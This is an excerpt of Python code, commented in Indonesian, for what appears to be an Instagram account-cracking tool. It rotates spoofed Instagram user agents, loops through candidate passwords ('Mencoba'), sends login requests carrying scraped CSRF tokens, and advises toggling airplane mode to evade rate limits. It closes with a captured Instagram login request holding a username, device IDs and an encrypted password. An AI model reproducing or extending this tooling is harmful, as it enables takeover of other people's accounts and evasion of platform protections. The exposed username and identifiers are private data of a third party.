...
class MAIN:
   ...
   def __init__(self):
       super(MAIN).__init__()
       self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; BV6000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 320dpi; 720x1280; Blackview; BV6000; Blackview; mt6755; uk_UA; 99640905)',}
  ...
  ▒ ░░ ░   ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ ''')
   ...
   def find_res(self, meki=[]):
       ...
       if len(meki) == 0:
          ...
          for memek in meki:
              try:
                  print(f'\n Mencoba: {H}{memek}{P}')
                  xyz = {'Mozilla/5.0 (Linux; Android 7.0; Power1 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36'}
   ...
   def aset_ig(self):
       ...
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 191.0.0.25.122 (iPhone13,1; iOS 14_4_2; en_CA; en-CA; scale=2.88; 1080x2338; 296543649) NW/3'}
...
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
   ...
   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {'Host': 'www.instagram.com','x-requested-with': 'XMLHttpRequest','x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),'x-ig-app-id': '1217981644879628','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def AppUac(self, GoblokLu=None):
        ...
        return(random.choice([
              ...
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; OPPO MOBILITY LIMITED/oppo; {str(random.choice(self.oppo))}; {str(random.choice(self.oppo2))}; qcom; in_ID; {self.kode})',
              ...
              f'Barcelona {self.versi_istagram} (iPhone{self.iphn}; iOS {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; realme; {self.realme}; RE5C6CL1; qcom; in_ID; {self.kode})',
       ]))
   ...
   # metodhe api
   POST /api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/ HTTP/2
...
x-pigeon-session-id: UFS-48d3987d-1569-452f-96dd-6751dbaf2b29-0

x-pigeon-rawclienttime: 1737864220.739
...
x-mid: Z5WhLAABAAHiuWcGwBE7FoHnXCez
...
params=%7B%22client_input_params%22%3A%7B%22sim_phones%22%3A%5B%5D%2C%22secure_family_device_id%22%3A%22%22%2C%22has_granted_read_contacts_permissions%22%3A0%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A1%3A1737864220%3AASmnQX3L4PeEQGEKW3sAAULvOhcDsa0FqAwIfmjnC%2B7F1Ep3NoD2qHEd9AmkcTW4J9eOEx4NGdz6L2J3kVso74w1byXUA6Oc8wgv7XYhui7c%2F4%2Bm0DOueca5%2FXDQ86WQcb79FqvuJUrGUMzFJ7dYM23STXu3bSZNDSpV7kKS45lmIGE8FkrFc88bO4H51eBN5zXxwCALYi8ooAAC2R2fxVJsr5oz6Zykn3jK5GAm2zCFk1BLv0U5%2FPopVLf176faCPZtGUQHD%2BCrrFM3JOivEu5NW5FLASsQWV0sqOnnuVNmD5lDGaFaA8vBG7%2FeqUas9%2FRLBOZEfMRY9xu%2F1eLZHjy999xn1ZIiMlLYK4YvAV7SaACczlFcfgH9JxaQBE%2FTbJyiqs8nTK%2FfsQ%3D%3D%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22event_flow%22%3A%22login_manual%22%2C%22password_contains_non_ascii%22%3A%22false%22%2C%22client_known_key_hash%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22has_granted_read_phone_permissions%22%3A0%2C%22app_manager_id%22%3A%22%22%2C%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22android-4aca695260085376%22%2C%22login_attempt_count%22%3A1%2C%22machine_id%22%3A%22Z5WhLAABAAHiuWcGwBE7FoHnXCez%22%2C%22accounts_list%22%3A%5B%5D%2C%22family_device_id%22%3A%2298ccf8dc-1ecc-4663-9077-2d18309090f0%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%7D%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22contact_point%22%3A%22jimb.o1591%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%229fa1bce7-df85-4e28-aa57-89a3c9c0ee7c%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%223hasry%3A69%22%2C%22is_from_empty_password%22%3A0%2C%22is_from_msplit_fallback%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22username_text_input_id%22%3A%223hasry%3A68%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-4aca695260085376%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A2.104558540014E13%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%2298ccf8dc-1ecc-4663-9077-2d18309090f0%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73
